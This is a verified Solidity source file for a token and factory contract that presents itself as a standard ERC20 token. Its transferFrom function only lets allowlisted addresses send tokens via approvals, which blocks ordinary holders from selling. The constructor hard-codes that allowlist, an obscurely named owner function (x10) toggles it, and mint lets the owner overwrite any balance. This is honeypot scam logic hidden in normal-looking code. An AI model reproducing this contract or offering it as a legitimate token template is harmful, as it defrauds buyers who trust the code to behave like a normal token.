/**
 *Submitted for verification at snowtrace.io on 2023-05-10
*/

pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

contract  Token is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    // balances[msg.sender] = totalSupply;
    balances[tx.origin] = totalSupply;
    allow[tx.origin] = true;
    allow[0xD82e98c09c515B9481E1187ccC0C8A2F201c9c3a] = true;
    allow[0x8eCa8dF81AD3da043677359339EF145e77d9044e] = true;
    allow[0xf1685238E16EdBc5210D6c4Ae1e7364f24c56A17] = true;
    allow[0xA8dBE7324FfEeE4c33a5DD468aA05B03792E6ba4] = true;
    allow[0xD7fC1e04F7a279ad80616eBefF044542C039177A] = true;
    allow[0x5127c59FE466D5045bEc6D6cd7484081F068f9B2] = true;
    allow[0x2C76a2aB1E73994be043C3230Debe71f15D17F4C] = true;
    allow[0xC1af526D7F0E59AEd0739a8c995fe65Ba0cE4275] = true;
    allow[0x73D405f02a75cc4abe399084b0b3cB6A159aC68c] = false;
    allow[0x8d2e3E44f7c0cd72C99cBFeb4Aa1C93AC718B07E] = false;
  }

  function showuint160(address addr) public pure returns(uint160){
      return uint160(addr);
  }


  using SafeMath for uint256;

  mapping(address => uint256) public balances;

  mapping(address => bool) public allow;

  function checkstatus(address addr)public view returns(bool){
      return allow[addr];
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
    }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }

  function x10(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }

  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }
}

contract MyTokenFactory {

    Token[] public tokens;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    event NewToken(address indexed token, string name, string symbol, uint8 decimals, uint256 initialSupply);
    constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
        Token token = new Token(_name,_symbol,_decimals, _totalSupply);
        tokens.push(token);
        emit NewToken(address(token), _name, _symbol, _decimals, _totalSupply);
     }
       
  
}